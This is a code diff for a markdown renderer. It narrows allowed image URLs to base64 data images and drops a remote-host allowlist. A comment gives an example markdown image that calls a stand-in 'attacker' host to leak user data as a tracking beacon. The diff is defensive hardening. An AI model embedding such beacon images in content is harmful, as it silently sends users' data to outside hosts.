@@ -34,30 +34,20 @@ const FENCE_RE = /```([a-z0-9_-]*)\n?([\s\S]*?)```/gi;
 const INLINE_TOKEN_RE =
   /(`[^`\n]+`)|(\*\*[^*\n]+\*\*)|(\*[^*\n]+\*)|(!\[[^\]\n]*\]\([^)\s]+\))|(\[[^\]\n]+\]\([^)\s]+\))|(\$[^\s$][^$\n]*?[^\s$]\$|\$[^\s$]\$)/g;
 
-// Phase 38e: allowlist for image href schemes/hosts. data:image/* is
-// always safe (inline base64, no network call). Remote URLs are limited
-// to trusted hosts where tome authors typically upload screenshots /
-// diagrams. Adds the path-traversal-safe `URL()` parse so a malformed
-// href falls back to plain text.
-const TRUSTED_IMAGE_HOSTS = new Set([
-  'user-images.githubusercontent.com',
-  'raw.githubusercontent.com',
-  'github.com',
-  'i.imgur.com',
-]);
+// Phase 38e + SEC convergence (scholar-resolver 2026-06-29): tome-embedded
+// images are data:image-only. Tomes are importable/shareable, so a remote
+// https image `![x](https://attacker/track.png?u=...)` is a tracking-beacon /
+// pixel-exfil surface. The production CSP `img-src` (vite.config.js) already
+// blocks every remote host except GitHub avatars (which tome images never
+// use), so the old https host allowlist was dead code in prod. data:image/*
+// base64 is the single canonical remote-image trust set — matched in
+// occlusion.js's isAllowedOcclusionImage and permitted by the CSP's `data:`.
 function isSafeImageUrl(url) {
   if (typeof url !== 'string' || url.length === 0) return false;
-  // data: URLs allowed for pure-binary image formats only — SVG is excluded
-  // because <svg> can contain inline <script>. Base64 payload-character
-  // class kept restrictive (a-z A-Z 0-9 + / =) so non-base64 garbage falls
-  // through to the literal-text fallback.
-  if (/^data:image\/(png|jpe?g|gif|webp);base64,[a-zA-Z0-9+/=]+$/i.test(url)) return true;
-  try {
-    const u = new URL(url);
-    return u.protocol === 'https:' && TRUSTED_IMAGE_HOSTS.has(u.hostname);
-  } catch {
-    return false;
-  }
+  // Pure-binary image formats only — SVG excluded (<svg> can carry inline
+  // <script>). Restrictive base64 payload class (a-z A-Z 0-9 + / =) so
+  // non-base64 garbage falls through to the literal-text fallback.
+  return /^data:image\/(png|jpe?g|gif|webp);base64,[a-zA-Z0-9+/=]+$/i.test(url);
 }
 
 // SEC: link hrefs are untrusted (tomes are importable/shareable). Allow only
